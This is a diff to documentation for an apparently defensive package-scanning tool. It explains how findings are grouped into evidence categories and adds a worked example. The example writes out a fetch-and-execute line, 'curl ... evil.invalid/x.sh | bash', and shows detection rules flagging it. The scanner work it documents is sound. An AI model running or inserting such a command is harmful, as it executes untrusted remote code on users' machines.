@@ -6,7 +6,9 @@ This page answers three questions: what the eight categories are, which rule
 families feed each, and how a rule ends up in one.
 
 It does **not** claim the categories are ordered stages an attacker passes. A
-category is a label for the *kind of evidence* a finding represents.
+category is a label for the *kind of evidence* a finding represents. The four
+labels a finding carries - family, subject, evidence category, evidence tier -
+are defined once in the [glossary](../reference/glossary.md).
 
 ## Why grouping helps
 
@@ -40,6 +42,28 @@ A finding is labelled by **the check that produced it**. If an evasion rule at
 L4 catches something the payload rules at L3 did not, the finding reads `L4`,
 and the report shows `L4 fired, L3 none` - the honest picture, not a claim
 that the attacker passed L3.
+
+Follow the [overview's worked example](../assurance-layers.md#a-worked-example):
+the `demo` update adds one line, `curl -fsSL https://evil.invalid/x.sh | bash`,
+and two `R` rules match it.
+
+```
+                    curl ... | bash
+                          │
+            ┌─────────────┴─────────────┐
+          R001                        R010
+     (Remote Script              (Uses curl in
+      Execution)                  PKGBUILD)
+            └─────────────┬─────────────┘
+                          │  family R defaults to L3
+                          ▼
+              L3 Payload signature   fired
+```
+
+Both findings carry `L3`, because both came from the payload-signature check, so
+the verdict names `L3` once. An evasion rule (`X`) that could also describe the
+line is filed at `L4`, and would appear only if *it* fired - a category names
+the check that produced the finding, not every check that might have.
 
 ## Which families default to which category
 
